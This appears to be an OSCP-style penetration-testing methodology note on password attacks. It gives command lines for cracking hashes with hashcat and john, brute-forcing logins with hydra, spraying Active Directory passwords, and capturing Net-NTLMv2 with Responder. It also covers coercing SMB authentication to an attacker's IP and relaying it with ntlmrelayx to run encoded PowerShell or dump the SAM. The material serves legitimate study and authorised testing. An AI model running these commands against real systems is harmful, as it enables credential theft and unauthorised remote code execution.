---
tags: [methodology, passwords, cracking, oscp]
---

# 06 — Password Attacks

> Back to [[00 - Index (MOC)]]. Cracking hashes, brute-forcing logins, spraying. **Password reuse is the single most productive tactic** — every cred you find, try it everywhere.

## Identify the hash first
```bash
hashid '<hash>'          # or
nth --text '<hash>'      # name-that-hash
# then look up the hashcat mode number
```

## hashcat — common modes
| Mode | Type | Where seen |
|-----:|------|-----------|
| 0 | MD5 | web dumps |
| 100 | SHA1 | web dumps |
| 1400 | SHA256 | web dumps |
| 3200 | bcrypt `$2a$` | modern apps |
| 1000 | NTLM | SAM / secretsdump |
| 5600 | NetNTLMv2 | Responder capture |
| 13100 | Kerberoast (TGS) | GetUserSPNs |
| 18200 | AS-REP | GetNPUsers |
| 1800 | sha512crypt `$6$` | /etc/shadow |
| 22921 | SSH key (RSA/enc) | via ssh2john |
| 13400 | KeePass | via keepass2john |

```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # +rules
hashcat -m <mode> hash.txt --show                                                 # already cracked?
```
> **Lesson:** don't run `hashcat -m 5600 rockyou.txt --force` — that treats rockyou as the *hashfile*. Syntax is `hashcat -m MODE hashfile wordlist`. Also `--force`/PoCL OOM segfaults on low-RAM VMs; fix the command, not with `--force`.

## john (when hashcat is awkward / need `*2john`)
```bash
ssh2john id_rsa > h;  john --wordlist=rockyou.txt h
keepass2john file.kdbx > h;  john --wordlist=rockyou.txt h
zip2john / rar2john / office2john / gpg2john ...
```

---

## Online brute force / spraying
```bash
# Login form / service brute
hydra -L users.txt -P pass.txt ssh://$IP
hydra -l admin -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# AD password spray (careful with lockout — check --pass-pol first)
nxc smb $DC -u users.txt -p 'Season2024!' --continue-on-success
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2024!'
```
Tools: [[CrackMapExec]] · [[kerbrute]] · [[DomainPasswordSpray.ps1]]

**Hash spray** (NT hashes pulled from a SAM/LSASS/NTDS dump, matched against usernames from the same dump) — PtH doesn't need cracking at all:
```bash
nxc smb $IP -u users -H hashes            # both files, one hash/user per line → finds valid combos directly
```
`lockoutThreshold: 0` (check via `--pass-pol` or raw `ldapsearch`, see [[05 - Active Directory]]) means this — and password spraying — can be run unlimited times, still noisy.

---

## Net-NTLMv2: capture → crack → relay
Unprivileged on a box, or no shell at all? Coerce a victim's SMB auth, then either **crack** the Net-NTLMv2 or **relay** it live to a box where that user is local admin.

**Capture** (crack path) — poison, grab, then hashcat `-m 5600`:
```bash
responder -I tun0                                   # poison LLMNR / NBT-NS / MDNS
# coerce: on victim  dir \\YOUR_IP\x   OR a web app's UNC field  \\YOUR_IP\x.txt
hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule
```

**Relay** (hash too strong to crack) — turn the live auth into command exec as the relayed user:
```bash
nxc smb <range> --gen-relay-list targets.txt        # list hosts with SMB signing OFF
impacket-ntlmrelayx --no-http-server -smb2support -t <box> -c "powershell -enc <b64>"
#   -i  interactive SMB  ·  -e payload.exe  ·  omit -c → dumps the target SAM
# coerce: on victim  dir \\YOUR_IP\x   → relays to -t → runs -c → SYSTEM/admin
```
> **No reflection** — relay to a *different* host than the auth came from (MS08-068 blocks relaying back).
> **SMB signing must be disabled** on the target, or the relay fails. Check with `--gen-relay-list` (host only appears if signing is off).
> **UAC remote restrictions** gate PtH/relay to the *real* local `Administrator` (RID 500) unless `LocalAccountTokenFilterPolicy=1` — the usual "authenticates but no code exec".
> `STATUS_SHARING_VIOLATION (0xc0000043)` = a relayed/dump file is locked → just re-coerce another auth; it goes through on retry.

Tools: [[Responder]] · [[Inveigh]] · [[ntlmrelayx]] — AD cert variant (ESC8) in [[05 - Active Directory]], full OSCP walkthrough in [[16-password-attacks]].

## Custom wordlists
```bash
cewl -d 2 -m 5 http://$IP -w cewl.txt        # scrape site for words
username-anarchy -i names.txt                # username permutations
hashcat --stdout cewl.txt -r rules/best64.rule > mangled.txt   # mangle
```
Common AD patterns: `Season+Year!`, `Company123!`, `Welcome1`, `<Month><Year>`.

---

## Where to spray every cred you find
- [ ] Web logins on all vhosts
- [ ] SSH / WinRM / RDP / FTP
- [ ] SMB across the whole subnet (`nxc smb <range>`)
- [ ] `su` to other local users
- [ ] MSSQL/MySQL logins → [[MSSQL]]
- [ ] KeePass / vaults → [[Keepass2]]

---

## References
- hashcat wiki modes: https://hashcat.net/wiki/doku.php?id=example_hashes
- CrackStation (online): https://crackstation.net
- PayloadsAllTheThings brute: https://github.com/swisskyrepo/PayloadsAllTheThings
